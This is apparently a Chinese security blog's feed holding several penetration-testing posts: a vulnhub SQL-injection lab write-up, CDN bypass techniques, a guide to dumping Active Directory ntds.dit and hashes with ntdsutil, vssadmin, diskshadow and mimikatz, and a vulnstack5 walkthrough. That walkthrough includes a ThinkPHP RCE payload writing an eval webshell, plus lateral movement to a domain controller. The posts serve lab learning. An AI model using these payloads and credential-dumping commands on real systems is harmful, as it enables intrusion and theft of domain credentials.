<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45596239/article/details/102844386">https://blog.csdn.net/weixin_45596239/article/details/102844386</a><br><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">https://blog.csdn.net/weixin_44912169/article/details/105845909</a><br><a href="https://blog.csdn.net/gramdog/article/details/80374119">https://blog.csdn.net/gramdog/article/details/80374119</a><br><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-hackme靶机</title>
    <url>/posts/9f82d7d9/</url>
    <content><![CDATA[<p>就简单写写思路，最近开始实习了，也没多少时间去写这种靶场的笔记了</p>
<h3 id="获取靶机ip"><a href="#获取靶机ip" class="headerlink" title="获取靶机ip"></a>获取靶机ip</h3><p><code>arp-scan -l</code> 获取靶机的ip 为 192.168.0.198</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>nmap -sV 192.168.0.198</code></p>
<p>开放了22 80端口</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用dirsearch扫描目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">39:05] 200 -    0B  - /config.php                                          </span><br><span class="line">[17:39:07] 200 -  100B  - /index.php                                                         </span><br><span class="line">[17:39:07] 200 -  100B  - /index.php/login/</span><br><span class="line">[17:39:08] 200 -    1KB - /login.php                                                       </span><br><span class="line">[17:39:08] 302 -    0B  - /logout.php  -&gt;  login.php</span><br><span class="line">[17:39:10] 200 -    2KB - /register.php                                                     </span><br><span class="line">[17:39:10] 403 -  302B  - /server-status/                                              </span><br><span class="line">[17:39:10] 403 -  301B  - /server-status</span><br><span class="line">[17:39:11] 301 -  316B  - /uploads  -&gt;  http://192.168.0.198/uploads/                     </span><br><span class="line">[17:39:11] 200 -  940B  - /uploads/                     </span><br><span class="line">                                         </span><br></pre></td></tr></table></figure>

<p>访问下 <code>/uploads</code> 看到里面内容为上传</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>访问下80端口，是一个注册登录框</p>
<p>注册后登录 有一个搜索功能，测试了下发现有sql注入</p>
<p><code>a&#39; or 1=1 #</code>  这里<code>--+ </code>不可以，<code>-- </code> 可以</p>
<p>使用order by 没有回显</p>
<p>直接使用union select 试下有几个字段</p>
<p><code>a&#39; union select 1,2,3-- a</code> 发现有三个字段</p>
<p><code>a%27+union+select+version%28%29%2Cdatabase%28%29%2C@@datadir--+a</code></p>
<p>分别得到 <code>5.7.25-0ubuntu0.18.10.2  </code> <code> webapphacking</code> <code> /var/lib/mysql/ SG</code></p>
<p><code>a&#39; union SELECT table_name,2,3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE();-- </code></p>
<p>得到<code>users</code> 和 <code>books</code>两个表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| Column  | Type                 |</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| user    | varchar(30)          |</span><br><span class="line">| address | varchar(50)          |</span><br><span class="line">| id      | smallint(5) unsigned |</span><br><span class="line">| name    | varchar(30)          |</span><br><span class="line">| pasword | varchar(70)          |</span><br><span class="line">+---------+----------------------+</span><br></pre></td></tr></table></figure>

<p>   dump得到账户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">superDatabase: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[7 entries]</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| id | name         | user       | address        | pasword                                     |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |</span><br><span class="line">| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |</span><br><span class="line">| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |</span><br><span class="line">| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            |</span><br><span class="line">| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 13 | testtest     | testtest   | testtest       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>但是这条superadmin的密码 sqlmap没有解出来  </p>
<p><a href="https://crackstation.net/">https://crackstation.net/</a> 可以进行破解 最终得到密码为 <code>Uncrackable</code>(用国内的没解出来)</p>
<p>使用superadmin进行登录，登陆后发现有一个上传功能</p>
<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>使用蚁剑直接生成shell.php上传就可以连接，这里没有做防护</p>
<p>得到www-data权限</p>
<p><code>cat /etc/passwd</code></p>
<p>后面发现主机上有两个用户 分别为<code>hackme</code> 和<code> legacy</code></p>
<p>在legacy目录下存在一个可执行文件 运行后发现没反应，后续看了下最后是通过这个文件进行提权的，但是在这里却用不了，用不了就算了，这个靶机还是比较简单，就一个sql注入，最近一直在实习，也没什么时间，周末有时间的话就看看文章，复现下漏洞，打打靶场啥的，弟弟太菜了，努力呀！</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CDN绕过查找真实IP</title>
    <url>/posts/619fb955/</url>
    <content><![CDATA[<h3 id="首先要验证网站是否存在CDN"><a href="#首先要验证网站是否存在CDN" class="headerlink" title="首先要验证网站是否存在CDN"></a>首先要验证网站是否存在CDN</h3><h4 id="一般可以通过多地ping-看对应的IP是否唯一"><a href="#一般可以通过多地ping-看对应的IP是否唯一" class="headerlink" title="一般可以通过多地ping 看对应的IP是否唯一"></a>一般可以通过多地ping 看对应的IP是否唯一</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
<h3 id="绕过CDN查真实IP"><a href="#绕过CDN查真实IP" class="headerlink" title="绕过CDN查真实IP"></a>绕过CDN查真实IP</h3><h4 id="查历史CDN记录"><a href="#查历史CDN记录" class="headerlink" title="查历史CDN记录"></a>查历史CDN记录</h4><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> 查询DNS</p>
<p><a href="https://sitereport.netcraft.com/?url=">https://sitereport.netcraft.com/?url=</a> </p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
<h4 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h4><p>有些网站可能只会对主站或部分大流量子站做CDN，而很多小站或者子站刚好又和主站在同一台服务器或者同一个C端中，就可以通过查找子域名来寻找真实ip</p>
<h5 id="在线子域名机器"><a href="#在线子域名机器" class="headerlink" title="在线子域名机器"></a>在线子域名机器</h5><p><code>https://dnsdb.io/zh-cn/</code> 输入 baidu.com type:A 就可以搜集其子域名和ip</p>
<h5 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h5><p><code>site:baidu.com -www</code>  可以查看排除www的子域名</p>
<h5 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h5><ul>
<li>layer子域名挖掘机</li>
<li>lijiejie的subdomainbrute</li>
</ul>
<h4 id="使用Fofa-shodan-zoomeye"><a href="#使用Fofa-shodan-zoomeye" class="headerlink" title="使用Fofa shodan zoomeye"></a>使用Fofa shodan zoomeye</h4><p>一般常用Fofa 可以通过 title body  ip 等语法进行查询</p>
<h4 id="利用SSL证书寻找真实IP"><a href="#利用SSL证书寻找真实IP" class="headerlink" title="利用SSL证书寻找真实IP"></a>利用SSL证书寻找真实IP</h4><p>可以使用 <code>https://censys.io/</code> 进行查询</p>
<h4 id="通过icon-hash查ip"><a href="#通过icon-hash查ip" class="headerlink" title="通过icon hash查ip"></a>通过icon hash查ip</h4><p>一般先将 favicon.ico 保存到本地，然后上传到fofa上即可</p>
<h4 id="使用国外主机解析域名"><a href="#使用国外主机解析域名" class="headerlink" title="使用国外主机解析域名"></a>使用国外主机解析域名</h4><p>有些国内的CDN厂可能只做了国内线路，而针对国外的线路可能几乎没有，所以尝试使用国外的主机去访问可能会得到真实ip</p>
<h4 id="通过网站漏洞查找真实ip"><a href="#通过网站漏洞查找真实ip" class="headerlink" title="通过网站漏洞查找真实ip"></a>通过网站漏洞查找真实ip</h4><p>可以通过phpinfo之类的探针，xss. ssrf, 命令执行反弹shell 源码泄漏 敏感信息泄漏之类</p>
<h4 id="F5-LTM解码法（还没尝试过，抽时间测试下）"><a href="#F5-LTM解码法（还没尝试过，抽时间测试下）" class="headerlink" title="F5 LTM解码法（还没尝试过，抽时间测试下）"></a>F5 LTM解码法（还没尝试过，抽时间测试下）</h4><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>ntds.dit导出及解析</title>
    <url>/posts/77c245ea/</url>
    <content><![CDATA[<h3 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h3><h4 id="使用ntdsutil-工具提取"><a href="#使用ntdsutil-工具提取" class="headerlink" title="使用ntdsutil 工具提取"></a>使用ntdsutil 工具提取</h4><p>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe可以维护和管理互动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPRome.exe）成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，可以通过域内机器在域控制器上远程操作。</p>
<p>ntdsutil.exe 支持的操作系统包括 Windows server 2003 ，Windows server 2008，Windows server 2012</p>
<p> 使用方法如下</p>
<h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p>该快照包含windows中的所有文件，且在复制文件时不会受到windows锁定机制的限制</p>
<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
<p>{}内为快照的GUID</p>
<p><img src="/posts/77c245ea/ntdsutil_create_snapshot.png"></p>
<h5 id="挂载快照"><a href="#挂载快照" class="headerlink" title="挂载快照"></a>挂载快照</h5><p><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_load_snapshot.png"></p>
<h5 id="拷贝快照"><a href="#拷贝快照" class="headerlink" title="拷贝快照"></a>拷贝快照</h5><p>使用windows自带的copy命令将快照中的文件复制出来,将快照中的<code>C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit</code>复制到本地计算机的 <code>C:\Users\Administrator\Desktop\</code> 桌面上</p>
<p><code>copy C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</code></p>
<p><img src="/posts/77c245ea/copy_ntds.png"></p>
<h5 id="卸载并删除快照"><a href="#卸载并删除快照" class="headerlink" title="卸载并删除快照"></a>卸载并删除快照</h5><p><code>ntdsutil snapshot &quot;unmout &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_delete_snapshot.png"></p>
<h5 id="检查快照是否删除"><a href="#检查快照是否删除" class="headerlink" title="检查快照是否删除"></a>检查快照是否删除</h5><p><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_check_snapshot.png"></p>
<br>

<h4 id="利用vssadmin提取ntds-dit"><a href="#利用vssadmin提取ntds-dit" class="headerlink" title="利用vssadmin提取ntds.dit"></a>利用vssadmin提取ntds.dit</h4><p><code>vssadmin</code>是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p>
<p>适用于   Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
<h5 id="创建一个C盘的卷影拷贝"><a href="#创建一个C盘的卷影拷贝" class="headerlink" title="创建一个C盘的卷影拷贝"></a>创建一个C盘的卷影拷贝</h5><p><code>vssadmin create shadow /for=c:</code></p>
<h5 id="将创建的卷影拷贝中的ntds-dit-copy到桌面"><a href="#将创建的卷影拷贝中的ntds-dit-copy到桌面" class="headerlink" title="将创建的卷影拷贝中的ntds.dit copy到桌面"></a>将创建的卷影拷贝中的ntds.dit copy到桌面</h5><p><code>copy \\?\CLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\User\Administrator\Desktop ntds.dit</code></p>
<h5 id="删除创建的卷影拷贝"><a href="#删除创建的卷影拷贝" class="headerlink" title="删除创建的卷影拷贝"></a>删除创建的卷影拷贝</h5><p><code>vssadmin delete shadows /for=c:  /quiet</code></p>
<p><img src="/posts/77c245ea/vssadmin.png"></p>
<br>

<h4 id="利用vssown-vbs-脚本提取nods-dit"><a href="#利用vssown-vbs-脚本提取nods-dit" class="headerlink" title="利用vssown.vbs 脚本提取nods.dit"></a>利用vssown.vbs 脚本提取nods.dit</h4><p>下载地址：<code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></p>
<p>vssown.vbs功能与vssadmin类似，本质是通过wmi对shadowCopt进行操作，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//启动卷影拷贝服务</span><br><span class="line">cscript vssown.vbs /start</span><br><span class="line">//创建一个C盘的卷影拷贝</span><br><span class="line">cscript vssown.vbs /create c</span><br><span class="line">//列出当前卷影拷贝</span><br><span class="line">cscript vssown.vbs /list</span><br><span class="line">//复制ntds.dit到桌面</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</span><br><span class="line">//删除卷影拷贝</span><br><span class="line">cscript vssown.vbs /delete &#123;GUID&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/vssown.png"></p>
<h4 id="使用ntdsutil中的IFM获取ntds-dit"><a href="#使用ntdsutil中的IFM获取ntds-dit" class="headerlink" title="使用ntdsutil中的IFM获取ntds.dit"></a>使用ntdsutil中的IFM获取ntds.dit</h4><p>将ntds.dit复制到<code>C:\test\Active Directory\ </code>文件夹中</p>
<p>使用管理员模式打开cmd输入如下</p>
<p><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:/test&quot; q  q</code></p>
<p><img src="/posts/77c245ea/ntdsutil_IFM.png"></p>
<p>然后访问c盘 可以看到创建了一个test目录  </p>
<p>test目录下有俩个文件 分别为 <code>Active Directory</code>  和 <code>registry</code></p>
<p><code>registry</code>下包含 <code>SYSTEM</code> 和 <code>SECURITY</code></p>
<p><code>Active Directory</code>下包含 <code>ntds.dit</code></p>
<p><img src="/posts/77c245ea/test_file.png"></p>
<p>然后将以上内容复制到桌面</p>
<p>这里选择使用<code>Copy-VSS.ps1</code></p>
<p>下载地址：<code>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</code></p>
<p>进入powershell </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-Executionpolicy bypass</span><br><span class="line">Import-Module .\Copy-VSS.ps1  //导入脚本</span><br><span class="line">copy-vss    //执行脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/copy_vss.png"></p>
<br>

<h4 id="使用diskshadow导出ntds-dit"><a href="#使用diskshadow导出ntds-dit" class="headerlink" title="使用diskshadow导出ntds.dit"></a>使用diskshadow导出ntds.dit</h4><p><code>Diskshadow.exe</code>使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下，Diskshadow.exe使用了一种交互式的命令解释器,这里跟DiskRaid或者DiskPart比较类似。因为diskshadow的代码是由微软签名的，而且<code>Windows Server2008、Windows Server2012、Windows Server2016都默认包含diskshadow</code>。所以，diskshadow也可以用来操作卷影拷贝服务并导出ntds.dit。diskshadow的功能与vshadow类似，且同样位于<code>C:\windows\system32\ </code>目录下.</p>
<p>由于是微软官方的工具，所以不会被杀</p>
<p>查看<code>diskshadow.exe</code> 的帮助信息</p>
<p><code>diskshdow /?</code></p>
<p>一般先在C盘写入需要执行的命令 存储为command.txt</p>
<p><code>echo &quot;exec c:\windows\system32\calc.exe&quot;  &gt;command.txt</code></p>
<p>但是这样生成的commod.txt会存在双引号 这样执行diskshadow命令的话 会无法正常执行，所以最好在执行diskshadow命令前先看下command.txt 是否正确</p>
<p><code>type c:\command.txt</code></p>
<p><code>diskshadow /s c:\command</code> </p>
<p>然后会弹出之前写的calc</p>
<p><img src="/posts/77c245ea/diskshadow_calc.png"></p>
<p>使用<code>diskshadow.exe</code>导出<code>ntds.dit</code> 将命令写入文本文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//设置卷影拷贝</span><br><span class="line">set context persistent nowriters</span><br><span class="line">//添加卷</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">//创建快照</span><br><span class="line">create</span><br><span class="line">//分配虚拟磁盘盘符</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">//将ntds.dit复制到C盘中</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy k:\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\</span><br><span class="line">//删除所有快照</span><br><span class="line">delete shadows all</span><br><span class="line">//列出系统中的卷影拷贝</span><br><span class="line">list shadows all</span><br><span class="line">//重置</span><br><span class="line">reset</span><br><span class="line">//退出</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>然后使用<code>diskshadow.exe</code>加载这个文本文件</p>
<p><code>diskshadow /s c:\2.txt</code></p>
<p>在执行这条命令时 要在system32下执行，否则可能会报错</p>
<p><img src="/posts/77c245ea/diskshadow_2.png"></p>
<p>导出ntds.dit后，可以将system.hive转储。因为system.hive中存放着ntds.dit的密钥，如果没有该密钥，将无法查看ntds.dit中的信息</p>
<p>可以使用Copy-VSS.ps1等方法导出SYSTEM文件，也可以执行如下命令，将导出system</p>
<p><code>reg save hklm\system C:\Users\Administrator\Desktop\system.hive</code></p>
<p><img src="/posts/77c245ea/reg_system.png"></p>
<br>

<h3 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a>解析ntds.dit</h3><h4 id="使用impacket-secretsdump解析ntds-dit"><a href="#使用impacket-secretsdump解析ntds-dit" class="headerlink" title="使用impacket secretsdump解析ntds.dit"></a>使用impacket secretsdump解析ntds.dit</h4><p><code>secretsdump.exe -system SYSTEM.hive -ntds ntds.dit LOCAL</code></p>
<p>然后可以看到所有用户的hash值</p>
<p><img src="/posts/77c245ea/secretsdump_ntds.png"></p>
<h4 id="利用dcsync-获取域散列值"><a href="#利用dcsync-获取域散列值" class="headerlink" title="利用dcsync 获取域散列值"></a>利用dcsync 获取域散列值</h4><h5 id="利用mimikatz在线导出hash"><a href="#利用mimikatz在线导出hash" class="headerlink" title="利用mimikatz在线导出hash"></a>利用mimikatz在线导出hash</h5><p>可以利用dcsync获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:mamor.com /all /csv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/mimikatz_dcsync.png"></p>
<p>也可以导出指定用户的hash值</p>
<p><code>lsadump::dcsync /domain:mamor.com /user:Mamor</code></p>
<p><img src="/posts/77c245ea/dcsync_user.png"></p>
<p>通过转储lsass.exe 进程对hash值进行dump</p>
<p><code>lsadump::lsa  /inject</code></p>
<p>这样可以导出所有账户和域散列值</p>
<p><img src="/posts/77c245ea/mimikatz_lsa1.png"></p>
<p><img src="/posts/77c245ea/mimikatz_lsa2.png"></p>
<h5 id="使用powershell-Invoke-DCSync-ps1脚本"><a href="#使用powershell-Invoke-DCSync-ps1脚本" class="headerlink" title="使用powershell Invoke-DCSync.ps1脚本"></a>使用powershell Invoke-DCSync.ps1脚本</h5><p>下载地址：<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
<p>该脚本可以利用dcsync 直接读取ntds.dit 以获得域账号和域散列值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // 导出域内administrator账户的hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/ps_invoke-DCSync.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/">https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/</a></p>
<p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1731472">https://cloud.tencent.com/developer/article/1731472</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack5靶场</title>
    <url>/posts/4f399e45/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><blockquote>
<p>2008     192.168.138.138(内网)             sun\admin 2021.com</p>
<p>win7     192.168.138.136(内网)            192.168.135.150(外网)</p>
<p>sun\leo123.com    sun\Administrator dc123.com</p>
<p>启动phpstudy</p>
<p>kali        192.168.135.128(外网)</p>
</blockquote>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap -sV 192.168.135.150 </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.135.150</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 991 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B5:F4:E9 (VMware)</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>开放了80，3306 系统为Win7</p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirmap -i 192.168.135.150 -lcf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Load targets from: 192.168.135.150</span><br><span class="line">[+] Set the number of thread: 30</span><br><span class="line">[+] Coroutine mode</span><br><span class="line">[+] Current target: http://192.168.135.150/                                                 </span><br><span class="line">[*] Launching auto check 404</span><br><span class="line">[+] Checking with: http://192.168.135.150/hsnwdxgvjhcohdgnyqwwyagtdjaanxwsamkblggcfg</span><br><span class="line">[*] Use recursive scan: No                                                                  </span><br><span class="line">[*] Use dict mode</span><br><span class="line">[+] Load dict:/home/kali/Tools/dirmap/data/dict_mode_dict.txt</span><br><span class="line">[*] Use crawl mode</span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/0                           </span><br><span class="line">[200][text/html; charset=utf-8][1.60kb] http://192.168.135.150/add.php                      </span><br><span class="line">[200][image/x-icon][1.12kb] http://192.168.135.150/favicon.ico                              </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/Index                        </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index                        </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.html                   </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.php                    </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/INDEX.PHP                    </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.PHP                    </span><br><span class="line">[200][text/plain][24.00b] http://192.168.135.150/robots.txt    </span><br></pre></td></tr></table></figure>

<p>查看报错页面可以发现为thinkphp V5.0.22</p>
<p>扫到一个大马  <code>http://192.168.135.150/add.php</code> 但是不知道密码多少</p>
<p><img src="/posts/4f399e45/dama.png"></p>
<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>访问80端口 版本为 thinkphp  V5.0.22</p>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># whoami</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"># phpinfo</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"># pwd</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=powershell%20pwd</span><br><span class="line"># 写一句话</span><br><span class="line"># 如果是linux使用echo写入文件 如果是win使用file_put_contents写入</span><br><span class="line"># ?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22pass%22])?^%3E%3Eshell.php</span><br><span class="line"># ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST%5B&#x27;pass&#x27;%5D)%3B%3F%3E</span><br><span class="line">http://192.168.135.150/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C%3Fphp%20eval(%24_POST[%27shell%27])%3B%3F%3E</span><br></pre></td></tr></table></figure>

<p>然后使用蚁剑连接 </p>
<p><img src="/posts/4f399e45/ant_shell.png"></p>
<p>发现是admin权限</p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>上线CS 为administrator权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">信息整理</span><br><span class="line">win7</span><br><span class="line">ip 192.168.138.136(内网)  192.168.135.150(外网)   DCip 192.168.138.138</span><br><span class="line">域 sun.com</span><br><span class="line">补丁      [01]: KB2534111</span><br><span class="line">          [02]: KB2999226</span><br><span class="line">          [03]: KB976902</span><br><span class="line">http://bugs.hacking8.com/tiquan/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后进行提权，但这里使用ms15-051 和 ms14-058都没成功</p>
<p>使用CS run mimikatz  读取到了Administrator 和 leo 的密码</p>
<p><img src="/posts/4f399e45/logonpassword.png"></p>
<p>扫描一下内网中的主机 445 </p>
<p><code>portscan 192.168.138.0/24 445 arp 50</code></p>
<p>尝试使用抓到的leo用户 进行psexec</p>
<p><img src="/posts/4f399e45/psexec_win_system.png"></p>
<p>得到win7 system权限</p>
<p>由于DC不出网使用win7作为跳板机建立Listener </p>
<p><img src="/posts/4f399e45/neiwang1.png"></p>
<p><img src="/posts/4f399e45/neiwang2.png"></p>
<p>然后通过psexec 上线DC 得到DC机器的system全息</p>
